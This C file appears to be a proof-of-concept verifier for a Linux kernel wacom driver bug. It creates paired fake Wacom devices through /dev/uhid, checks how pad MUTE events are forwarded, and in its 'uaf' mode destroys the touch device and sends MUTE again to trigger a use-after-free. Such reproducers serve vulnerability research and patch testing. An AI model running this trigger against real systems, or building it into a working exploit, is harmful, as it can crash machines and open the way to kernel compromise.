/*
 * CVE-2026-99491 分阶段验证器
 *
 * 用法：
 *   probe99491 pair          只建 T+P，枚举全部新增 evdev 节点与角色
 *   probe99491 hold [秒]     建 T+P 后保持 N 秒（默认 60），供 shell 侧观察 sysfs
 *   probe99491 forward       建 T+P，pad 发 MUTE，看 touch 是否收到 EV_SW
 *   probe99491 uaf           在 forward 基础上 destroy touch，再让 pad 发 MUTE
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>
#include <sys/ioctl.h>
#include <linux/uhid.h>
#include <linux/input.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "uhidpair/99"
#define NAME_TOUCH  "wacom-pair-touch"
#define NAME_PAD    "wacom-pair-pad"
#define MAXEV       512

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

static int list_events(char out[MAXEV][16]) {
    DIR *d = opendir("/dev/input");
    struct dirent *de;
    int n = 0;
    if (!d) return 0;
    while ((de = readdir(d)) && n < MAXEV) {
        if (!strncmp(de->d_name, "event", 5))
            snprintf(out[n++], 16, "%s", de->d_name);
    }
    closedir(d);
    return n;
}

static int dir_has(const char *path, const char *needle, char *out, size_t outsz) {
    DIR *d = opendir(path);
    struct dirent *de;
    if (out && outsz) out[0] = 0;
    if (!d) return -1;
    while ((de = readdir(d))) {
        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
        if (out) {
            size_t u = strlen(out);
            snprintf(out + u, outsz - u, "%s ", de->d_name);
        }
        if (needle && strstr(de->d_name, needle)) { closedir(d); return 1; }
    }
    closedir(d);
    return 0;
}

static int uhid_open(void) {
    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fd < 0) fprintf(stderr, "[-] open /dev/uhid: %s\n", strerror(errno));
    return fd;
}

static int uhid_create(int fd, const char *name, const char *phys,
                       unsigned pid, const unsigned char *rdesc, size_t rlen) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    strncpy((char *)ev.u.create2.name, name, sizeof(ev.u.create2.name) - 1);
    if (phys) strncpy((char *)ev.u.create2.phys, phys, sizeof(ev.u.create2.phys) - 1);
    strncpy((char *)ev.u.create2.uniq, name, sizeof(ev.u.create2.uniq) - 1);
    memcpy(ev.u.create2.rd_data, rdesc, rlen);
    ev.u.create2.rd_size = rlen;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    if (write(fd, &ev, sizeof(ev)) < 0) {
        fprintf(stderr, "[-] UHID_CREATE2(%s): %s\n", name, strerror(errno));
        return -1;
    }
    return 0;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

static int uhid_input_raw(int fd, const unsigned char *data, size_t len) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    if (len > sizeof(ev.u.input2.data)) len = sizeof(ev.u.input2.data);
    ev.u.input2.size = (unsigned short)len;
    memcpy(ev.u.input2.data, data, len);
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

static void pump(int fd, long ms, int verbose) {
    long dl = now_ms() + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_ms() < dl) {
        memset(&ev, 0, sizeof(ev));
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n > 0) {
            if (verbose) fprintf(stderr, "    [uhid ev type=%u]\n", ev.type);
            if (ev.type == UHID_GET_REPORT) {
                struct uhid_event r;
                memset(&r, 0, sizeof(r));
                r.type = UHID_GET_REPORT_REPLY;
                r.u.get_report_reply.id = ev.u.get_report.id;
                r.u.get_report_reply.err = 0;
                r.u.get_report_reply.size = 0;
                if (write(fd, &r, sizeof(r)) < 0) { /* ignore */ }
            }
        } else {
            usleep(20000);
        }
    }
    fcntl(fd, F_SETFL, fc);
}

static void enum_new_evdev(char old[MAXEV][16], int nold) {
    char cur[MAXEV][16];
    int n = list_events(cur);
    printf("\n[新增 evdev 节点]\n");
    int found = 0;
    for (int i = 0; i < n; i++) {
        int seen = 0;
        for (int j = 0; j < nold; j++)
            if (!strcmp(cur[i], old[j])) { seen = 1; break; }
        if (seen) continue;
        found = 1;
        char p[64];
        snprintf(p, sizeof(p), "/dev/input/%s", cur[i]);
        int fd = open(p, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        char nm[256] = {0};
        unsigned long evbits[4] = {0}, swbit = 0, keybit[4] = {0}, absbit[4] = {0};
        if (fd >= 0) {
            ioctl(fd, EVIOCGNAME(sizeof(nm) - 1), nm);
            ioctl(fd, EVIOCGBIT(0, sizeof(evbits)), evbits);
            ioctl(fd, EVIOCGBIT(EV_SW, sizeof(swbit)), &swbit);
            ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit);
            ioctl(fd, EVIOCGBIT(EV_ABS, sizeof(absbit)), absbit);
            close(fd);
        }
        printf("  %-16s name=\"%s\"\n", cur[i], nm);
        printf("      EV=0x%lx SW=0x%lx KEY0=0x%lx KEY8=0x%lx ABS0=0x%lx ABS1=0x%lx\n",
               evbits[0], swbit, keybit[0], keybit[1], absbit[0], absbit[1]);
    }
    if (!found) printf("  (无新增)\n");
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "pair";
    long hold_ms = 60000;
    if (!strcmp(mode, "hold") && argc > 2) hold_ms = strtol(argv[2], NULL, 0) * 1000L;
    int do_forward = !strcmp(mode, "forward") || !strcmp(mode, "uaf");
    int do_uaf = !strcmp(mode, "uaf");

    printf("=== CVE-2026-99491 验证 === mode=%s pid=%d\n", mode, getpid());

    char d0[MAXEV][16];
    int n0 = list_events(d0);
    char list[4096];
    dir_has("/sys/bus/hid/devices", NULL, list, sizeof(list));
    printf("[before] evdev=%d hid=%s\n", n0, list[0] ? list : "(none)");

    int fdt = uhid_open();
    int fdp = uhid_open();
    if (fdt < 0 || fdp < 0) return 2;

    if (uhid_create(fdt, NAME_TOUCH, PHYS_COMMON, 0x1101,
                    rdesc_touch, sizeof(rdesc_touch)) < 0) return 3;
    pump(fdt, 500, 0);
    if (uhid_create(fdp, NAME_PAD, PHYS_COMMON, 0x1102,
                    rdesc_pad, sizeof(rdesc_pad)) < 0) return 3;
    pump(fdp, 500, 0);
    usleep(1500000);

    char devs[4096];
    dir_has("/sys/bus/hid/devices", NULL, devs, sizeof(devs));
    printf("\n[P1] hid devices: %s\n", devs[0] ? devs : "(none)");
    printf("[P1] wacom bound 1101 = %s\n",
           dir_has("/sys/bus/hid/drivers/wacom", "056A:1101", NULL, 0) == 1 ? "YES" : "NO");
    printf("[P1] wacom bound 1102 = %s\n",
           dir_has("/sys/bus/hid/drivers/wacom", "056A:1102", NULL, 0) == 1 ? "YES" : "NO");

    enum_new_evdev(d0, n0);

    if (!strcmp(mode, "hold")) {
        printf("\n[HOLD] 保持 %ld 秒，可从 shell 侧观察\n", hold_ms / 1000);
        fflush(stdout);
        long dl = now_ms() + hold_ms;
        while (now_ms() < dl) {
            pump(fdt, 100, 0);
            pump(fdp, 100, 0);
            usleep(50000);
        }
        printf("[HOLD] 结束\n");
        goto cleanup;
    }

    int rc = 0;
    if (!do_forward) goto cleanup;

    /* P2: pad 发 MUTE，看谁收到 EV_SW */
    printf("\n[P2] pad 发 MUTE_DEVICE=1\n");
    {
        char cur[MAXEV][16];
        int n = list_events(cur);
        int fds[MAXEV], cnt = 0;
        for (int i = 0; i < n; i++) {
            int seen = 0;
            for (int j = 0; j < n0; j++)
                if (!strcmp(cur[i], d0[j])) { seen = 1; break; }
            if (seen) continue;
            char p[64];
            snprintf(p, sizeof(p), "/dev/input/%s", cur[i]);
            int fd = open(p, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
            if (fd >= 0) fds[cnt++] = fd;
        }
        /* 清空 */
        for (int i = 0; i < cnt; i++) {
            struct input_event e;
            while (read(fds[i], &e, sizeof(e)) == sizeof(e)) ;
        }
        unsigned char rep[2] = { 0x02, 0x02 };
        uhid_input_raw(fdp, rep, sizeof(rep));
        pump(fdp, 300, 0);
        pump(fdt, 300, 0);
        /* 读所有新节点 */
        long dl = now_ms() + 800;
        int total = 0;
        while (now_ms() < dl) {
            for (int i = 0; i < cnt; i++) {
                struct input_event e;
                while (read(fds[i], &e, sizeof(e)) == sizeof(e)) {
                    total++;
                    printf("  fd[%d] type=0x%x code=0x%x value=%d\n", i, e.type, e.code, e.value);
                }
            }
            usleep(10000);
        }
        printf("  共收到 %d 个 input_event\n", total);
        if (!total) {
            printf("  => MUTE 未产生任何事件：描述符未被识别为 pad MUTE，或未配对\n");
            rc = 10;
        }
        for (int i = 0; i < cnt; i++) close(fds[i]);
    }

    if (!do_uaf) goto cleanup;

    printf("\n[P3] destroy touch，再让 pad 发 MUTE\n");
    fflush(stdout);
    uhid_destroy(fdt);
    close(fdt); fdt = -1;
    pump(fdp, 600, 0);
    usleep(400000);
    {
        unsigned char rep[2] = { 0x02, 0x02 };
        uhid_input_raw(fdp, rep, sizeof(rep));
        pump(fdp, 400, 0);
    }
    printf("  完成：若显示本行说明未崩溃\n");

cleanup:
    if (fdp >= 0) { uhid_destroy(fdp); close(fdp); }
    if (fdt >= 0) { uhid_destroy(fdt); close(fdt); }
    printf("\n[cleanup] rc=%d\n", rc);
    return rc;
}